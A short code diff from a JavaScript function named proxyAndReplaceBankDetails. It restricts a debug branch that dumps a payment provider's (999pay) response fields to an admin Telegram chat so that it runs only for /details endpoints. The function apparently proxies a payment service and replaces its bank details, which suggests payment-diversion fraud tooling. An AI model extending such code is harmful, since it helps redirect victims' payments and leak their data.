@@ -1631,7 +1631,9 @@ async function proxyAndReplaceBankDetails(req, res, label) {
 
     // 🐛 AUTO-DEBUG: if amount STILL not detected, dump all keys+values from response
     // to Telegram so we can identify the exact field name 999pay uses.
-    if (!detectedAmount && respData && data.adminChatId && bot) {
+    // ONLY for /details endpoints (others like /simpleUserBank legitimately have no amount).
+    const isDetailsEndpoint = /\/details(\?|$)/i.test(req.originalUrl || '');
+    if (isDetailsEndpoint && !detectedAmount && respData && data.adminChatId && bot) {
       const flat = {};
       const collect = (obj, prefix, depth) => {
         if (!obj || typeof obj !== 'object' || depth > 4) return;
